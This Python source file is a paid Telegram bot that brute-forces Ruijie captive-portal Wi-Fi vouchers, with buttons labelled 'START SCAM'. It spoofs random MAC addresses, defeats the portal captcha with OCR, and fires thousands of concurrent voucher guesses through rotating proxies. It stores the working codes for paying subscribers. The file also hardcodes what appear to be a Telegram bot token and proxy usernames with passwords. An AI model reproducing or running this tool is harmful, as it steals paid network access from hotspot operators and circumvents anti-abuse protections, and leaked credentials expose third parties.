#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner Bot  —  v9.1-GITHUB-READY
#  - Admin: @Myogyi10384 (Auto-Paid)
#  - Forward: @Myogyi10384
#  - Optimized for GitHub & Cloud Deployments
# ==============================================

import telebot
import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import uuid
import threading
import logging
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import sqlite3
from contextlib import contextmanager

# --- Logging ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ======================================================
#  🔥 CONFIGURATION — GitHub Environment Variables Support
# ======================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8821237507:AAG6oLroWDJBU0VcAAglHIyyO1Pek0OPLW4")
ADMIN_IDS = ["6130147402"]
ADMIN_NAME = "Myogyi10384"
FORWARD_CHANNEL = "@Zawgyi1296"

# --- High Speed & Optimized Limits ---
MAX_CONCURRENT = 2000
BATCH_SIZE = 1500
CONNECTION_LIMIT = 50000
CONNECTION_PER_HOST = 25000
TIMEOUT = 10
DB_PATH = "bot_data.db"

PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129"
]
random.shuffle(PROXY_LIST)

# ======================================================

# --- Database Setup ---
_db_conn = None
_db_lock = threading.Lock()

def get_db_connection():
    global _db_conn
    with _db_lock:
        if _db_conn is None:
            _db_conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
            _db_conn.execute("PRAGMA journal_mode=WAL")
            _db_conn.execute("PRAGMA synchronous=NORMAL")
            _db_conn.execute("PRAGMA cache_size=10000")
            _db_conn.row_factory = sqlite3.Row
        return _db_conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, user_id TEXT, plan TEXT, expires_at TEXT, code_limit INTEGER DEFAULT 1000, used_codes INTEGER DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (user_id TEXT PRIMARY KEY, codes TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, key TEXT, registered_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_settings (user_id TEXT PRIMARY KEY, proxy_enabled INTEGER DEFAULT 1)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_checkpoints (user_id TEXT PRIMARY KEY, mode TEXT, last_code TEXT, start_digit TEXT, timestamp REAL)''')
    conn.commit()
    logger.info("Database initialized successfully")
init_db()

# --- In-memory Caches ---
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
paid_users = {}
_voucher_sem = None
_start_time = time.monotonic()
_connector = None

# --- Proxy Helpers ---
_proxy_index = 0
def get_next_proxy():
    if not PROXY_LIST:
        return None
    global _proxy_index
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    if not proxy.startswith(('http://', 'https://')):
        proxy = f"http://{proxy}"
    return proxy

# --- DB Helpers ---
@contextmanager
def get_db_cursor():
    conn = get_db_connection()
    try:
        yield conn.cursor()
        conn.commit()
    except Exception as e:
        conn.rollback()
        logger.error(f"DB error: {e}")
        raise

def db_get_key(key):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys WHERE key = ?", (key,))
        r = c.fetchone()
        return dict(r) if r else None

def db_get_user(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return dict(r) if r else None

def db_get_results(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT codes FROM results WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return json.loads(r[0]) if r else []

def db_save_results(user_id, codes):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO results (user_id, codes) VALUES (?, ?)", (user_id, json.dumps(codes)))

def db_add_user(user_id, key):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO users (user_id, key, registered_at) VALUES (?, ?, ?)",
                  (user_id, key, datetime.now(timezone.utc).isoformat()))

def db_add_key(key, user_id, plan, expires_at, code_limit):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO keys (key, user_id, plan, expires_at, code_limit, used_codes) VALUES (?, ?, ?, ?, ?, ?)",
                  (key, user_id, plan, expires_at, code_limit, 0))

def db_delete_key(key):
    with get_db_cursor() as c:
        c.execute("DELETE FROM keys WHERE key = ?", (key,))

def db_update_used_codes(key, used_codes):
    with get_db_cursor() as c:
        c.execute("UPDATE keys SET used_codes = ? WHERE key = ?", (used_codes, key))

def db_get_all_keys():
    with get_db_cursor() as c:
        c.execute("SELECT * FROM keys")
        return {r[0]: dict(r) for r in c.fetchall()}

def db_get_all_users():
    with get_db_cursor() as c:
        c.execute("SELECT user_id FROM users")
        return [r[0] for r in c.fetchall()]

def db_get_proxy_setting(user_id):
    with get_db_cursor() as c:
        c.execute("SELECT proxy_enabled FROM user_settings WHERE user_id = ?", (user_id,))
        r = c.fetchone()
        return bool(r[0]) if r else True

def db_set_proxy_setting(user_id, enabled):
    with get_db_cursor() as c:
        c.execute("INSERT OR REPLACE INTO user_settings (user_id, proxy_enabled) VALUES (?, ?)",
                  (user_id, 1 if enabled else 0))

def check_key_expiration(expires_at):
    if not expires_at:
        return False
    try:
        if expires_at == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

async def forward_to_channel(message_text, parse_mode=None):
    if not FORWARD_CHANNEL:
        return
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"Forward error: {e}")

# ==================== KEYBOARDS ====================
def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    if user_id:
        proxy_enabled = db_get_proxy_setting(user_id)
        proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"
    keyboard.add(
        InlineKeyboardButton("💸 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("💻🔓 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("🔢 DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("🔢 DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("🔤 ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("🔤 ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("🔤 ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton("🔤+🔢 MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton("🔤+🔢 MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton("🔤+🔢 MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = [InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}") for i in range(10)]
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"), InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("✅ KEY ထည့်ရန်", callback_data="menu_enter_key"), InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"), InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

# ==================== BOT INSTANCE ====================
bot = AsyncTeleBot(BOT_TOKEN)

# ==================== COMMANDS ====================
@bot.message_handler(commands=['help'])
async def help_command(message):
    user_id = str(message.chat.id)
    help_text = f"""📖 **Help Guide — {ADMIN_NAME} Bot**\n\n/start → Main Menu\n/key [key] → Register\n/portal [url] → Set Portal URL\n/scan [mode] → Start Scan\n/stop → Stop Scan"""
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or "User"
    if is_admin(user_id):
        approve[message.chat.id] = True
        paid_users[user_id] = True
        valid = True
    else:
        user_info = db_get_user(user_id)
        valid = False
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info and check_key_expiration(key_info["expires_at"]):
                valid = True
                approve[message.chat.id] = True
                paid_users[user_id] = True
    
    welcome_text = f"✨ RUIJIE VOUCHER SCANNER ✨\n\n👹 NAME: {user_name}\n🆔 USER ID: {user_id}\n\nအောက်ပါ Menu မှ ရွေးချယ်ပါ။" if valid else f"✨ RUIJIE VOUCHER SCANNER ✨\n\n⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။"
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    user_id = str(message.chat.id)
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "🔗 Portal URL ထည့်သွင်းရန်: /portal [url]")
        return
    user_data.setdefault(message.chat.id, {})['session_url'] = args[1]
    await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။", reply_markup=get_voucher_keyboard())

# ==================== SCAN ENGINE ====================
async def get_session_id(session, session_url):
    mac = ':'.join(f'{x:02x}' for x in [random.choice([0x02, 0x06, 0x0A, 0x0E])] + [random.randint(0x00, 0xff) for _ in range(5)])
    url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
    try:
        async with session.get(url, allow_redirects=True) as req:
            match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', str(req.url))
            return match.group(1) if match else None
    except:
        return None

_ocr = None
def _ocr_sync(image_bytes):
    global _ocr
    if _ocr is None:
        try: _ocr = ddddocr.DdddOcr(show_ad=False)
        except: return None
    try:
        img = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)
        _, thresh = cv2.threshold(cv2.cvtColor(img, cv2.COLOR_BGR2GRAY), 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        return _ocr.classification(cv2.imencode('.png', thresh)[1].tobytes()).upper()
    except: return None

async def perform_check(session_url, code, chat_id, scan_id=None):
    global _connector
    post_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as session:
            session_id = await get_session_id(session, session_url)
            if not session_id: return
            
            async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params={'sessionId': session_id, '_t': str(time.time())}) as req:
                img_bytes = await req.read()
            
            text = await asyncio.to_thread(_ocr_sync, img_bytes)
            if not text: return
            
            async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json={'sessionId': session_id, 'authCode': text}) as req:
                if not (await req.json()).get("success"): return
            
            async with session.post(post_url, json={"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}) as req:
                response = await req.text()
                if 'logonUrl' in response:
                    success_texts.setdefault(chat_id, []).append(f"🔥 {code}")
                    results = db_get_results(str(chat_id))
                    if code not in results:
                        results.append(code)
                        db_save_results(str(chat_id), results)
    except: pass

def iter_codes(mode):
    length = int(mode) if mode in ["6", "7", "8"] else 6
    if mode in ["6", "7"]:
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
    else:
        while True:
            yield "".join(random.choice(string.digits) for _ in range(length))

async def run_bruteforce(mode, chat_id, session_url, scan_id, progress_msg):
    global _voucher_sem
    code_iter = iter_codes(mode)
    checked = 0
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)
        
    while chat_id in scan_tasks and not scan_tasks[chat_id].get("stop"):
        batch = [next(code_iter, None) for _ in range(BATCH_SIZE)]
        batch = [c for c in batch if c is not None]
        if not batch: break
        
        await asyncio.gather(*(perform_check(session_url, code, chat_id, scan_id) for code in batch), return_exceptions=True)
        checked += len(batch)
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=f"🔍 Scanning... Checked: {checked:,} | Found: {len(success_texts.get(chat_id, []))}")
        except: pass
    scan_tasks.pop(chat_id, None)

# ==================== WEB SERVER & MAIN ====================
async def handle(request):
    return web.Response(text="Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8099))).start()

async def main():
    global _connector
    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, limit_per_host=CONNECTION_PER_HOST, ssl=False, force_close=False)
    asyncio.create_task(web_server())
    await bot.infinity_polling(timeout=20, request_timeout=20)

if __name__ == '__main__':
    asyncio.run(main())
